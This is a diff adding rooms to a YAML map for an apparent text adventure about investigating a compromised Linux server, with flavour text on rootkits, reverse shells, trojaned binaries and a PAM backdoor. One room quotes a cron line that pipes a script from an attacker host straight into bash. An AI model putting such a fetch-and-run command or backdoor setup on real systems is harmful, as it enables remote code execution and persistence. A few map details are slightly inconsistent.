@@ -737,6 +737,755 @@ rooms:
       north: {room: root_home, type: open}
     items: [root_shell]
 
+  # ===========================================================================
+  # /sys — kernel sysfs interface (15 rooms)
+  # ===========================================================================
+
+  sys:
+    name: "/sys"
+    description_seed: "The sysfs virtual filesystem. A structured view into the kernel's device model. Every bus, every device, every driver is represented here as a directory tree. Unlike /proc's chaotic dump, /sys is orderly — almost clinically so."
+    connections:
+      south: {room: root_fs, type: open}
+      east: {room: sys_class, type: open}
+      west: {room: sys_block, type: open}
+      north: {room: sys_kernel, type: open}
+
+  sys_class:
+    name: "/sys/class"
+    description_seed: "Device classes. net/, block/, input/, tty/ — each contains symlinks to device instances. The organization is elegant. Every piece of hardware has an address here."
+    connections:
+      west: {room: sys, type: open}
+      east: {room: sys_class_net, type: open}
+      south: {room: sys_class_input, type: open}
+
+  sys_class_net:
+    name: "/sys/class/net"
+    description_seed: "Network interfaces. eth0, lo, tun0, docker0. Each directory reveals interface state — operstate, speed, mtu, statistics. The tun0 interface is active — the attacker's VPN tunnel. It wasn't here before the compromise."
+    connections:
+      west: {room: sys_class, type: open}
+      south: {room: sys_class_net_eth0, type: open}
+
+  sys_class_net_eth0:
+    name: "/sys/class/net/eth0"
+    description_seed: "The primary ethernet interface. operstate: up. speed: 1000. carrier: 1. Statistics show unusual traffic patterns — outbound bytes far exceed inbound. Data is being exfiltrated."
+    connections:
+      north: {room: sys_class_net, type: open}
+
+  sys_class_net_tun0:
+    name: "/sys/class/net/tun0"
+    description_seed: "The attacker's tunnel interface. A VPN connection to 10.0.0.99. Created by the reverse shell service. Traffic destined for the attacker's subnet is routed through here. Destroying this interface would cut one access path."
+    connections:
+      north: {room: sys_class_net, type: open}
+
+  sys_class_input:
+    name: "/sys/class/input"
+    description_seed: "Input devices. Keyboard, mouse, power button. A keylogger module has registered an additional input device — 'event99'. It captures every keystroke and writes to /tmp/.hidden/keylog."
+    connections:
+      north: {room: sys_class, type: open}
+
+  sys_block:
+    name: "/sys/block"
+    description_seed: "Block devices. sda, sdb, loop0 through loop7. Each shows partitions, size, I/O statistics. sda is the system disk. sdb appeared recently — a USB drive that was plugged in and quickly removed. Evidence?"
+    connections:
+      east: {room: sys, type: open}
+      south: {room: sys_block_sda, type: open}
+      west: {room: sys_block_sdb, type: open}
+
+  sys_block_sda:
+    name: "/sys/block/sda"
+    description_seed: "The primary disk. 500GB. Three partitions: sda1 (boot, 512MB), sda2 (root, 480GB), sda3 (swap, 20GB). I/O statistics show heavy write activity in the last 72 hours — the attacker has been busy."
+    connections:
+      north: {room: sys_block, type: open}
+
+  sys_block_sdb:
+    name: "/sys/block/sdb"
+    description_seed: "A phantom disk. The device appeared briefly — long enough to mount and copy files — then disappeared. The kernel log shows 'USB Mass Storage device detected' followed by 'device disconnected' 4 minutes later. Someone used a USB drive."
+    connections:
+      east: {room: sys_block, type: open}
+
+  sys_kernel:
+    name: "/sys/kernel"
+    description_seed: "Kernel parameters exposed through sysfs. Security settings, debug flags, module information. Some security parameters have been weakened — kptr_restrict is 0 (kernel pointers exposed), dmesg_restrict is 0."
+    connections:
+      south: {room: sys, type: open}
+      east: {room: sys_kernel_security, type: open}
+      west: {room: sys_kernel_debug, type: open}
+
+  sys_kernel_security:
+    name: "/sys/kernel/security"
+    description_seed: "The Linux Security Modules interface. AppArmor profiles, SELinux booleans, audit rules. SELinux is in permissive mode — logging violations but not enforcing. The attacker disabled enforcement to avoid being blocked."
+    connections:
+      west: {room: sys_kernel, type: open}
+    items: [selinux_armor]
+
+  sys_kernel_debug:
+    name: "/sys/kernel/debug"
+    description_seed: "debugfs. Kernel debugging information. ftrace, kprobes, memory allocator stats. The ftrace log shows function calls — including calls from the rootkit module intercepting sys_getdents64 (the readdir system call, hiding files)."
+    connections:
+      east: {room: sys_kernel, type: open}
+
+  sys_firmware:
+    name: "/sys/firmware"
+    description_seed: "Firmware interfaces. ACPI tables, EFI variables, DMI data. The ACPI tables are standard. The EFI variables show Secure Boot is disabled — another vector the attacker could exploit for persistence below the OS."
+    connections:
+      south: {room: sys_kernel, type: open}
+
+  sys_module:
+    name: "/sys/module"
+    description_seed: "Loaded kernel modules. Each module has a directory: parameters, refcnt, holders. The 'rootkit' module is listed. Its parameters show which files and PIDs it's configured to hide."
+    connections:
+      east: {room: sys_kernel, type: open}
+
+  # ===========================================================================
+  # /run — runtime data (6 rooms)
+  # ===========================================================================
+
+  run:
+    name: "/run"
+    description_seed: "Runtime volatile data. tmpfs — everything here vanishes on reboot. PID files, socket files, lock files, systemd runtime state. A snapshot of what's running right now."
+    connections:
+      south: {room: root_fs, type: open}
+      east: {room: run_systemd, type: open}
+      west: {room: run_lock, type: open}
+      north: {room: run_user, type: open}
+
+  run_systemd:
+    name: "/run/systemd"
+    description_seed: "Systemd's runtime state. The system journal, unit states, session tracking. loginctl shows active sessions — including session c3, owned by 'backdoor', logged in from 10.0.0.99. Still active."
+    connections:
+      west: {room: run, type: open}
+
+  run_lock:
+    name: "/run/lock"
+    description_seed: "Lock files for running services. LCK..ttyS0, subsys/. A lock file named '.update-helper.lock' sits here — the reverse shell's lock, preventing multiple instances."
+    connections:
+      east: {room: run, type: open}
+
+  run_user:
+    name: "/run/user"
+    description_seed: "Per-user runtime directories. /run/user/1000 (guest), /run/user/0 (root). A directory for UID 0 exists with a strange systemd scope — the backdoor user's session, running as root."
+    connections:
+      south: {room: run, type: open}
+
+  run_udev:
+    name: "/run/udev"
+    description_seed: "udev runtime data. Device events, rules state, hardware database. The udev rules include a custom rule that triggers when a USB device is inserted — it copies the device contents to /tmp/.hidden/usb-exfil."
+    connections:
+      west: {room: run, type: open}
+
+  run_sshd:
+    name: "/run/sshd"
+    description_seed: "OpenSSH daemon runtime. The sshd PID file, host keys loaded at startup. sshd is running with the compromised configuration — root login enabled, password auth enabled, the attacker's key in authorized_keys."
+    connections:
+      east: {room: run, type: open}
+
+  # ===========================================================================
+  # /usr/share — shared data (7 rooms)
+  # ===========================================================================
+
+  usr_share:
+    name: "/usr/share"
+    description_seed: "Architecture-independent shared data. Man pages, documentation, locale files, icons, terminfo. The collected wisdom of the system — if you know where to look."
+    connections:
+      south: {room: usr, type: open}
+      east: {room: usr_share_man, type: open}
+      west: {room: usr_share_doc, type: open}
+
+  usr_share_man:
+    name: "/usr/share/man"
+    description_seed: "Manual pages. man1 through man8. Thousands of pages documenting every command, every system call, every configuration file. Knowledge is power. A man page for 'update-helper' has been added — the attacker documented their own backdoor."
+    connections:
+      west: {room: usr_share, type: open}
+      south: {room: usr_share_man_man8, type: open}
+
+  usr_share_man_man8:
+    name: "/usr/share/man/man8"
+    description_seed: "Section 8 — system administration commands. iptables.8, sshd.8, useradd.8. The essential reading for any sysadmin. Deep knowledge of these tools is your greatest weapon."
+    connections:
+      north: {room: usr_share_man, type: open}
+
+  usr_share_doc:
+    name: "/usr/share/doc"
+    description_seed: "Documentation for installed packages. READMEs, changelogs, license files. The changelog for libpam-modules shows the last legitimate update was 6 months ago — before the compromise."
+    connections:
+      east: {room: usr_share, type: open}
+      south: {room: usr_share_doc_openssh, type: open}
+
+  usr_share_doc_openssh:
+    name: "/usr/share/doc/openssh-server"
+    description_seed: "OpenSSH documentation. Configuration examples, security best practices, upgrade notes. A sticky note is attached: 'REMINDER: Disable PasswordAuthentication before going to production.' Ignored, apparently."
+    connections:
+      north: {room: usr_share_doc, type: open}
+
+  usr_share_locale:
+    name: "/usr/share/locale"
+    description_seed: "Locale data. Translations, character sets, time zones. Everything needed to present the system in any language. Strangely, a new locale 'zh_CN.UTF-8' was installed recently. The system doesn't serve Chinese users."
+    connections:
+      north: {room: usr_share, type: open}
+
+  usr_share_terminfo:
+    name: "/usr/share/terminfo"
+    description_seed: "Terminal capability databases. xterm, vt100, screen, tmux. The ancient knowledge of how to talk to terminals. Each entry describes escape codes, color capabilities, cursor movement. Low-level communication."
+    connections:
+      east: {room: usr_share, type: open}
+
+  # ===========================================================================
+  # /var expanded — cache, backups, tmp (10 rooms)
+  # ===========================================================================
+
+  var_cache:
+    name: "/var/cache"
+    description_seed: "Application caches. apt package cache, DNS cache, font cache. Caches speed things up but also retain information. The apt cache shows recently downloaded packages: netcat, socat, nmap, python3-pip."
+    connections:
+      north: {room: var, type: open}
+      east: {room: var_cache_apt, type: open}
+      west: {room: var_cache_dns, type: open}
+    items: [cache_hit]
+
+  var_cache_apt:
+    name: "/var/cache/apt"
+    description_seed: "The APT package cache. .deb files for every package installed or upgraded. The cache reveals the attacker's tool installation — timestamps show netcat, socat, and nmap were installed within minutes of the initial compromise."
+    connections:
+      west: {room: var_cache, type: open}
+
+  var_cache_dns:
+    name: "/var/cache/dns"
+    description_seed: "DNS cache. Recent lookups. Most are normal — debian.org, github.com. But several queries resolve to 'c2.darknet.onion' through a Tor exit node. The C2 domain, cached in plain sight."
+    connections:
+      east: {room: var_cache, type: open}
+
+  var_backup:
+    name: "/var/backups"
+    description_seed: "System backups. dpkg package lists, passwd/shadow backups, old apt keyrings. The dpkg.list.0 backup is from before the compromise — comparing it to the current state reveals which packages the attacker installed."
+    connections:
+      south: {room: var, type: open}
+      east: {room: var_backup_shadow, type: open}
+
+  var_backup_shadow:
+    name: "/var/backups (shadow backup)"
+    description_seed: "A backup of /etc/shadow from before the compromise. Comparing it to the current shadow file reveals the 'backdoor' user was added. The backup doesn't contain it. Clean evidence of when the account was created."
+    connections:
+      west: {room: var_backup, type: open}
+
+  var_tmp:
+    name: "/var/tmp"
+    description_seed: "Persistent temporary files. Unlike /tmp, these survive reboots. The attacker knows this — compiled binaries and persistence scripts live here, carefully hidden among legitimate apt temp files."
+    connections:
+      east: {room: var, type: open}
+    enemies: [segfault_daemon_2]
+
+  var_log_daemon:
+    name: "/var/log/daemon.log"
+    description_seed: "Daemon log. Every background service reports here. The update-helper service logs its startup: 'Connecting to 10.0.0.99:4444...' followed by 'Connection established.' The reverse shell announcing itself."
+    connections:
+      south: {room: var_log, type: open}
+
+  var_log_cron:
+    name: "/var/log/cron.log"
+    description_seed: "Cron execution log. Every scheduled task is logged here. The malicious cron job runs every 5 minutes: 'CMD (curl -s http://10.0.0.99/beacon.sh | bash)'. A beacon script, checking in with the C2 server."
+    connections:
+      east: {room: var_log, type: open}
+
+  var_log_lastlog:
+    name: "/var/log/lastlog"
+    description_seed: "Last login records. The 'backdoor' user last logged in from 10.0.0.99 at 2:17 AM, 71 hours ago. The 'root' user was accessed via su from the 'backdoor' session 30 minutes later. A timeline of the compromise."
+    connections:
+      west: {room: var_log, type: open}
+
+  # ===========================================================================
+  # /home expanded — backup user, more detail (6 rooms)
+  # ===========================================================================
+
+  home_backup:
+    name: "/home/backup"
+    description_seed: "The backup operator's home. Automated backup scripts run from here — rsync, borg, restic. The backup logs show the last successful backup was 4 days ago — before the compromise. A clean backup exists."
+    connections:
+      south: {room: home, type: open}
+      east: {room: home_backup_data, type: open}
+
+  home_backup_data:
+    name: "/home/backup/data"
+    description_seed: "Backup data. Compressed archives of the entire system, taken daily. The pre-compromise backup is gold — it contains the original, untampered binaries. You could restore from here."
+    connections:
+      west: {room: home_backup, type: open}
+    items: [clean_backup]
+
+  home_guest_tmp:
+    name: "/home/guest/tmp"
+    description_seed: "Your personal temp directory. Scratch files, test scripts, downloaded files. Normal working detritus. Nothing suspicious here — this is the one clean corner of the system."
+    connections:
+      east: {room: home_guest, type: open}
+
+  home_admin_docs:
+    name: "/home/admin/docs"
+    description_seed: "Admin documentation. Network diagrams, runbooks, incident response procedures. A document titled 'Security Audit — 6 months ago' lists every vulnerability that was supposed to be fixed. None were."
+    connections:
+      west: {room: home_admin, type: open}
+    items: [audit_report]
+
+  home_dev_docker:
+    name: "/home/dev/docker"
+    description_seed: "The developer's Docker configuration. Dockerfiles, compose files, .env files with API keys and database passwords. The .env file contains production database credentials in plaintext."
+    connections:
+      north: {room: home_dev, type: open}
+
+  home_attacker_tools:
+    name: "/home/.hidden/tools"
+    description_seed: "The attacker's compiled tools. Custom builds of chisel (tunnel tool), pspy (process spy), linpeas (privilege escalation scanner). Well-organized. Professional. This wasn't a script kiddie — this was methodical."
+    connections:
+      north: {room: home_attacker, type: open}
+
+  # ===========================================================================
+  # /mnt and /media — mounted filesystems (6 rooms)
+  # ===========================================================================
+
+  mnt:
+    name: "/mnt"
+    description_seed: "Mount points. Temporary mounts for removable media and network filesystems. Two mounts are active: a USB drive and an NFS share from another server."
+    connections:
+      east: {room: root_fs, type: open}
+      south: {room: mnt_usb, type: open}
+      west: {room: mnt_nfs, type: open}
+
+  mnt_usb:
+    name: "/mnt/usb"
+    description_seed: "A mounted USB drive. Contains a directory called 'evidence' — someone was collecting forensic artifacts. Disk images, memory dumps, network captures. Someone started an investigation but didn't finish it."
+    connections:
+      north: {room: mnt, type: open}
+      east: {room: mnt_usb_evidence, type: open}
+    items: [usb_drive]
+
+  mnt_usb_evidence:
+    name: "/mnt/usb/evidence"
+    description_seed: "Forensic evidence collected onto the USB drive. A pcap file shows the initial exploit — a serialized Java object in an HTTP POST to the legacy app. The attacker's IP, the payload, the timestamp. Proof."
+    connections:
+      west: {room: mnt_usb, type: open}
+    items: [pcap_evidence]
+
+  mnt_nfs:
+    name: "/mnt/nfs"
+    description_seed: "An NFS mount from 192.168.1.10 — the file server. Read-only access. Contains shared documents, team repositories, and deployment artifacts. The NFS export is too permissive — root_squash is disabled."
+    connections:
+      east: {room: mnt, type: open}
+      south: {room: mnt_nfs_share, type: open}
+
+  mnt_nfs_share:
+    name: "/mnt/nfs/shared"
+    description_seed: "Shared network files. Deployment scripts, configuration templates, team documentation. One deployment script has been modified — it includes a backdoor that runs on every deploy to the web server."
+    connections:
+      north: {room: mnt_nfs, type: open}
+
+  media:
+    name: "/media"
+    description_seed: "Automount directory for removable media. Empty now — the USB drive was manually mounted at /mnt/usb. A ghost directory from a previous mount: 'RECOVERY_DISK'. Someone tried to boot from recovery media."
+    connections:
+      east: {room: root_fs, type: open}
+
+  # ===========================================================================
+  # /dev expanded (5 rooms)
+  # ===========================================================================
+
+  dev_tty:
+    name: "/dev/tty"
+    description_seed: "The controlling terminal. Your window into the system. Characters flow in, characters flow out. The terminal is the oldest interface — older than GUIs, older than networks, older than most operating systems."
+    connections:
+      north: {room: dev, type: open}
+
+  dev_shm:
+    name: "/dev/shm"
+    description_seed: "Shared memory. A tmpfs filesystem for inter-process communication. Fast, volatile, dangerous. The attacker left a shared memory segment containing the decryption key for their C2 communications. Sloppy."
+    connections:
+      east: {room: dev, type: open}
+    items: [c2_decrypt_key]
+
+  dev_loop:
+    name: "/dev/loop"
+    description_seed: "Loop devices. Block devices backed by files — used for mounting disk images. loop0 is active, mounting a suspicious .img file from /tmp/.hidden. It contains the attacker's encrypted filesystem."
+    connections:
+      west: {room: dev, type: open}
+
+  dev_mapper:
+    name: "/dev/mapper"
+    description_seed: "Device mapper. LVM logical volumes, encrypted LUKS partitions, dm-crypt. The system's disk encryption infrastructure. A new mapper device 'attacker_vol' was created — an encrypted volume for storing stolen data."
+    connections:
+      south: {room: dev_sda, type: open}
+
+  dev_urandom:
+    name: "/dev/urandom"
+    description_seed: "The non-blocking random source. Less random than /dev/random, but never blocks. Used by most applications for key generation, nonces, salts. The entropy pool flows like a lazy river."
+    connections:
+      north: {room: dev_random, type: open}
+
+  # ===========================================================================
+  # /proc expanded (6 rooms)
+  # ===========================================================================
+
+  proc_cpuinfo:
+    name: "/proc/cpuinfo"
+    description_seed: "CPU information. 4 cores, Intel Xeon E5-2680, 2.70GHz. Hyperthreading enabled. The processor flags include 'vmx' — hardware virtualization support. The system could be running VMs. Is it?"
+    connections:
+      east: {room: proc, type: open}
+
+  proc_meminfo:
+    name: "/proc/meminfo"
+    description_seed: "Memory statistics. 16GB total, 12GB used, 2GB cached, 2GB free. Suspiciously high usage for a server with modest workloads. The cryptocurrency miner is eating memory."
+    connections:
+      west: {room: proc, type: open}
+
+  proc_mounts:
+    name: "/proc/mounts"
+    description_seed: "Currently mounted filesystems. /, /boot, /tmp, /dev/shm, and... a mount that doesn't belong: /tmp/.hidden/attacker.img on /tmp/.hidden/mnt type ext4. The attacker's encrypted filesystem, mounted and accessible."
+    connections:
+      south: {room: proc, type: open}
+
+  proc_loadavg:
+    name: "/proc/loadavg"
+    description_seed: "System load average. 3.72 2.91 2.45. The 1-minute average is nearly 4 — on a 4-core system, that means 100% CPU utilization. The cryptocurrency miner is consuming every available cycle."
+    connections:
+      north: {room: proc, type: open}
+
+  proc_modules:
+    name: "/proc/modules"
+    description_seed: "Loaded kernel modules. Standard modules: ext4, nfs, iptable_filter. And one that shouldn't be there: 'rootkit 16384 0 - Live'. Loaded, active, hiding files and processes at the kernel level."
+    connections:
+      east: {room: proc_sys, type: open}
+
+  proc_interrupts:
+    name: "/proc/interrupts"
+    description_seed: "Hardware interrupt counters. IRQ assignments and counts. The network interface is generating an unusual number of interrupts — consistent with high-volume data transfer. The exfiltration in progress."
+    connections:
+      west: {room: proc_sys, type: open}
+
+  # ===========================================================================
+  # /tmp expanded (4 rooms)
+  # ===========================================================================
+
+  tmp_systemd_private:
+    name: "/tmp/systemd-private"
+    description_seed: "Systemd's private temp directories. Isolated namespaces for service temp files. Each service gets its own /tmp that other services can't see. Except the attacker's service — it runs without PrivateTmp."
+    connections:
+      north: {room: tmp, type: open}
+
+  tmp_x11:
+    name: "/tmp/.X11-unix"
+    description_seed: "X11 display server sockets. Unix domain sockets for the X Window System. On a headless server, these shouldn't exist. But they do — the attacker set up X11 forwarding for a graphical tool."
+    connections:
+      south: {room: tmp, type: open}
+
+  tmp_apt:
+    name: "/tmp/apt-dpkg"
+    description_seed: "APT's temporary working directory. Package extraction, dpkg staging. Evidence of recent package installation — the attacker's tools were installed through apt, leaving traces here."
+    connections:
+      east: {room: tmp, type: open}
+
+  tmp_miner:
+    name: "/tmp/.hidden/miner"
+    description_seed: "A cryptocurrency mining directory. The miner binary, its configuration (mining pool address, wallet ID), and a wrapper script that restarts it if killed. The wallet address is a trail to the attacker's identity."
+    connections:
+      south: {room: tmp_hidden, type: open}
+    items: [miner_config]
+    enemies: [crypto_miner]
+
+  # ===========================================================================
+  # /usr expanded (6 rooms)
+  # ===========================================================================
+
+  usr_include:
+    name: "/usr/include"
+    description_seed: "C header files. stdio.h, stdlib.h, unistd.h — the interface definitions for the C standard library. The foundational contracts that every program on this system was built against."
+    connections:
+      east: {room: usr, type: open}
+
+  usr_src:
+    name: "/usr/src"
+    description_seed: "Source code. Kernel headers for the running kernel, downloaded source packages. A modified kernel source tree is here — the rootkit's source code, left behind by the attacker. Sloppy, or deliberate?"
+    connections:
+      west: {room: usr, type: open}
+    items: [rootkit_source]
+
+  usr_games:
+    name: "/usr/games"
+    description_seed: "Games. fortune, cowsay, bsdgames. Even on a compromised server, fortune dispenses wisdom: 'In the land of the blind, the one-eyed man is king.' Apt, given the trojaned binaries in /usr/bin."
+    connections:
+      south: {room: usr, type: open}
+    items: [fortune_cookie]
+
+  usr_lib_python3:
+    name: "/usr/lib/python3"
+    description_seed: "Python 3 standard library. The attacker's scripts are written in Python — they imported requests, paramiko (SSH), and cryptography. The installed packages tell the story of the attack tools."
+    connections:
+      south: {room: usr_lib, type: open}
+
+  usr_sbin_iptables:
+    name: "/usr/sbin/iptables"
+    description_seed: "The iptables binary. The firewall management tool. Currently useless — all rules have been flushed. But the binary itself is intact, untrojaned. It can be used to restore the firewall."
+    connections:
+      east: {room: usr_sbin, type: open}
+
+  usr_bin_coreutils:
+    name: "/usr/bin (coreutils)"
+    description_seed: "Core utilities. cp, mv, rm, chmod, chown. The bedrock commands. Checksums verify these are untampered — the attacker only trojaned the information-gathering tools (ls, ps, netstat), not the action tools."
+    connections:
+      south: {room: usr_bin, type: open}
+    items: [kill_nine]
+
+  # ===========================================================================
+  # /opt expanded (4 rooms)
+  # ===========================================================================
+
+  opt_monitoring_prom:
+    name: "/opt/monitoring/prometheus"
+    description_seed: "Prometheus metrics database. Time-series data for CPU, memory, disk, network. The dashboards show a clear inflection point 72 hours ago — CPU jumped to 100%, outbound traffic spiked, new processes appeared."
+    connections:
+      east: {room: opt_monitoring, type: open}
+
+  opt_monitoring_grafana:
+    name: "/opt/monitoring/grafana"
+    description_seed: "Grafana dashboards. Beautiful visualizations of system health — all screaming red. High CPU, high network, disk I/O through the roof. The alert history shows 47 unacknowledged critical alerts."
+    connections:
+      west: {room: opt_monitoring, type: open}
+
+  opt_legacy_deploy:
+    name: "/opt/legacy-app/deploy"
+    description_seed: "Deployment scripts for the legacy app. deploy.sh, rollback.sh, health-check.sh. The deploy script was last run 72 hours ago — by the 'backdoor' user. They deployed a modified version of the application."
+    connections:
+      east: {room: opt_legacy, type: open}
+
+  opt_legacy_data:
+    name: "/opt/legacy-app/data"
+    description_seed: "Application data. Upload directories, session files, temporary data. The upload directory contains PHP files — web shells uploaded through the application's file upload feature. No input validation."
+    connections:
+      west: {room: opt_legacy, type: open}
+    enemies: [web_shell_guardian]
+
+  # ===========================================================================
+  # /srv expanded (4 rooms)
+  # ===========================================================================
+
+  srv_git_repos:
+    name: "/srv/git/repos"
+    description_seed: "Individual git repositories. The application repo, the infrastructure repo, the documentation repo. Git log shows the attacker committed to the infrastructure repo — modifying the Terraform that provisions new servers."
+    connections:
+      east: {room: srv_git, type: open}
+
+  srv_git_hooks:
+    name: "/srv/git/hooks"
+    description_seed: "Git server-side hooks. post-receive hooks trigger deployments. The attacker added a post-receive hook that installs the backdoor on every new server provisioned through git push. Supply chain infection."
+    connections:
+      south: {room: srv_git, type: open}
+
+  srv_docker_volumes:
+    name: "/srv/docker/volumes"
+    description_seed: "Docker volumes. Persistent data for containers. The 'miner' volume contains a cryptocurrency mining container's configuration. It starts automatically via a docker-compose file in the attacker's hidden directory."
+    connections:
+      south: {room: srv_docker, type: open}
+
+  srv_docker_images:
+    name: "/srv/docker/images"
+    description_seed: "Docker images. The local image cache. Along with legitimate images (nginx, postgres, redis), there's an image tagged 'utils:latest' — it's a container with the attacker's full toolkit pre-installed."
+    connections:
+      north: {room: srv_docker, type: open}
+
+  # ===========================================================================
+  # /lost+found and miscellaneous (4 rooms)
+  # ===========================================================================
+
+  lost_found:
+    name: "/lost+found"
+    description_seed: "The filesystem's recovery area. Files recovered after a crash or fsck — orphaned inodes, corrupted files, fragments. Rarely visited. A recovered file fragment contains part of the attacker's initial exploit payload."
+    connections:
+      west: {room: root_fs, type: open}
+    items: [recovered_fragment]
+
+  lost_found_deep:
+    name: "/lost+found (deep)"
+    description_seed: "Deeper in lost+found. More recovered fragments. A partial log file from the initial compromise — timestamps, commands, the attacker's first steps on the system. Invaluable forensic evidence."
+    connections:
+      north: {room: lost_found, type: open}
+
+  # ===========================================================================
+  # Shortcut corridors and hidden passages (6 rooms)
+  # ===========================================================================
+
+  pipe_shortcut_var_usr:
+    name: "Pipe Tunnel (var↔usr)"
+    description_seed: "A UNIX pipe connecting /var to /usr. Data flows through here — log entries being processed by tools. Walking through the pipe is faster than traversing the directory tree."
+    connections:
+      east: {room: var, type: open}
+      west: {room: usr, type: open}
+
+  symlink_etc_proc:
+    name: "Symlink Passage (etc↔proc)"
+    description_seed: "A symbolic link creates a shortcut between /etc and /proc. Configuration informs the running system; the running system reflects configuration. A natural bridge."
+    connections:
+      north: {room: etc, type: open}
+      south: {room: proc, type: open}
+
+  hardlink_usr_opt:
+    name: "Hard Link Corridor (usr↔opt)"
+    description_seed: "A hard link — two directory entries pointing to the same inode. /usr and /opt share this passage. Unlike a symlink, this connection cannot be broken by removing one end."
+    connections:
+      north: {room: usr_local, type: open}
+      south: {room: opt, type: open}
+
+  dev_proc_bridge:
+    name: "Device-Process Bridge"
+    description_seed: "Where /dev meets /proc. Device files are created by the kernel, process info is exposed by the kernel — they share the same origin. This bridge lets you move quickly between hardware and software views."
+    connections:
+      east: {room: dev, type: open}
+      west: {room: proc, type: open}
+
+  inode_tunnel:
+    name: "Inode Tunnel"
+    description_seed: "A passage through the inode table itself. Below the directory tree, below the filesystem, where data blocks are addressed by number. Fast travel for those who know the system's internals."
+    connections:
+      north: {room: root_fs, type: open}
+      south: {room: root_home, type: locked}
+
+  # ===========================================================================
+  # Additional rooms to reach 200 (22 rooms)
+  # ===========================================================================
+
+  etc_hosts:
+    name: "/etc/hosts"
+    description_seed: "The hosts file. Static hostname-to-IP mappings that override DNS. Someone added an entry: '10.0.0.99 updates.debian.org'. Any attempt to reach the real Debian update server is silently redirected to the C2 server. Poisoned."
+    connections:
+      east: {room: etc, type: open}
+
+  etc_resolv:
+    name: "/etc/resolv.conf"
+    description_seed: "DNS resolver configuration. nameserver 8.8.8.8, nameserver 1.1.1.1. Standard public DNS. But a third entry has been added: nameserver 10.0.0.99. The attacker's DNS server, intercepting queries for their domains."
+    connections:
+      west: {room: etc, type: open}
+
+  etc_fstab:
+    name: "/etc/fstab"
+    description_seed: "The filesystem table. Which filesystems mount where at boot. A new entry mounts an NFS share from 10.0.0.99 at /mnt/backup — the attacker added a persistent connection to their infrastructure."
+    connections:
+      north: {room: etc, type: open}
+
+  etc_network:
+    name: "/etc/network/interfaces"
+    description_seed: "Network interface configuration. eth0 configured with a static IP. A second interface definition — tun0 — has been added, configured to establish a VPN tunnel to 10.0.0.99 on boot."
+    connections:
+      south: {room: etc_ssh, type: open}
+
+  etc_logrotate:
+    name: "/etc/logrotate.d"
+    description_seed: "Log rotation policies. Each file defines how long logs are kept, how they're compressed, when they're rotated. The attacker modified the auth.log policy — it now rotates daily and keeps only 1 day. Evidence destruction on a schedule."
+    connections:
+      north: {room: etc_cron_d, type: open}
+
+  proc_version:
+    name: "/proc/version"
+    description_seed: "The kernel version string. Linux 5.15.0-91-generic. Compiled with GCC 11.4.0. The kernel is two minor versions behind — security patches are available but not applied."
+    connections:
+      east: {room: proc_1, type: open}
+
+  proc_cmdline:
+    name: "/proc/cmdline"
+    description_seed: "The kernel command line from boot. BOOT_IMAGE=/vmlinuz root=/dev/sda2 ro quiet splash. Normal boot parameters. No evidence of kernel-level tampering — the rootkit was loaded after boot via modprobe."
+    connections:
+      west: {room: proc_1, type: open}
+
+  proc_filesystems:
+    name: "/proc/filesystems"
+    description_seed: "Supported filesystems. ext4, tmpfs, nfs, overlay, fuse. The 'overlay' entry is significant — Docker uses it. The attacker's mining container is running on an overlay mount."
+    connections:
+      south: {room: proc_self, type: open}
+
+  dev_stderr:
+    name: "/dev/stderr"
+    description_seed: "Standard error. Where warnings and errors are sent. In the UNIX Catacombs, stderr is your friend — error messages reveal what's happening beneath the surface. A debug log streams past."
+    connections:
+      west: {room: dev_tty, type: open}
+
+  dev_stdin:
+    name: "/dev/stdin"
+    description_seed: "Standard input. Where data enters a process. The source of all commands, all queries, all interaction. You are stdin — every command you type flows through here."
+    connections:
+      east: {room: dev_tty, type: open}
+
+  var_lib_dpkg:
+    name: "/var/lib/dpkg"
+    description_seed: "The dpkg database. Package state for every installed package — name, version, status, checksums. Comparing installed file checksums to the database reveals which binaries have been tampered with. Three mismatches: ls, ps, netstat."
+    connections:
+      south: {room: var_lib, type: open}
+
+  var_lib_apt:
+    name: "/var/lib/apt"
+    description_seed: "APT state. Package lists, extended states, auto/manual install markers. The 'extended_states' file shows netcat, socat, and nmap were manually installed 72 hours ago — not as dependencies of anything legitimate."
+    connections:
+      north: {room: var_lib, type: open}
+
+  usr_share_zoneinfo:
+    name: "/usr/share/zoneinfo"
+    description_seed: "Timezone data. Every timezone in the world, from Africa/Abidjan to Zulu. The system timezone is set to UTC — standard for servers. The attacker's login timestamps are in UTC too, giving no clue about their location."
+    connections:
+      south: {room: usr_share, type: open}
+
+  usr_lib_security:
+    name: "/usr/lib/security"
+    description_seed: "PAM modules. pam_unix.so, pam_deny.so, pam_permit.so, pam_rootok.so. The modified pam_unix.so contains a hardcoded password — 'master_key_2024'. Any user can authenticate with this password. A PAM backdoor."
+    connections:
+      north: {room: usr_lib, type: open}
+    enemies: [pam_backdoor]
+
+  tmp_crash:
+    name: "/tmp/crash"
+    description_seed: "Crash reports. Apport and whoopsie crash data. Several crashes from the past 72 hours — the cryptocurrency miner occasionally segfaults under heavy load and restarts itself."
+    connections:
+      west: {room: tmp, type: open}
+
+  opt_java:
+    name: "/opt/java"
+    description_seed: "Java Runtime Environment. JRE 8 Update 65 — ancient. CVE-2015-4852, the infamous Java deserialization vulnerability, is present. This is the vulnerability the attacker used for initial access."
+    connections:
+      north: {room: opt_legacy, type: open}
+
+  srv_backup:
+    name: "/srv/backup"
+    description_seed: "Server backup storage. Borg backup repository, backup schedules, retention policies. The backups run nightly. The attacker hasn't touched them — they either don't know about them or don't care."
+    connections:
+      south: {room: srv, type: open}
+
+  home_guest_history:
+    name: "/home/guest/.bash_history"
+    description_seed: "Your command history. Everything you've typed. Scrolling back reveals commands you don't remember typing — the injected .bashrc eval ran commands in your session context without your knowledge."
+    connections:
+      north: {room: home_guest_bashrc, type: open}
+
+  proc_net_tcp:
+    name: "/proc/net/tcp"
+    description_seed: "Raw TCP connection table. Hex-encoded local and remote addresses, connection state, socket inode numbers. Entry 7: local 0100007F:1159, remote 630000A:115C, state 01 (ESTABLISHED). The reverse shell, encoded in hex."
+    connections:
+      east: {room: proc_net, type: open}
+
+  sys_class_misc:
+    name: "/sys/class/misc"
+    description_seed: "Miscellaneous device classes. fuse, device-mapper, snapshot. The 'fuse' device is busy — the attacker is using FUSE to mount their encrypted filesystem without needing kernel modules."
+    connections:
+      west: {room: sys_class, type: open}
+
+  var_spool_cron:
+    name: "/var/spool/cron"
+    description_seed: "User crontabs. Per-user scheduled tasks separate from the system crontabs in /etc/cron.d. The 'backdoor' user has a crontab: @reboot /usr/local/bin/update-helper. The reverse shell, restarting on every boot."
+    connections:
+      east: {room: var_spool, type: open}
+
